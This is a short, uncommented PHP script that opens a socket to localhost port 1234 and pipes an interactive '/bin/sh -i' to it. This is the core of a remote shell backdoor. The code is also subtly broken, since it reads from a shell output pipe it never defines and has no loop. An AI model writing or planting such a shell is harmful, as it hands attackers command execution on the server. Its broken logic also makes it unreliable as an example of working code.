<?php
$s = fsockopen("localhost", 1234);
$shell = "/bin/sh -i";
$p = proc_open($shell, array(0=>array("pipe","r")), $pipes);
if (is_resource($p)) {
 $data = fread($s, 10);
 fwrite($pipes[0], $data);
 $other = fread($pipes[1], 10);
 fwrite($s, $other);
}
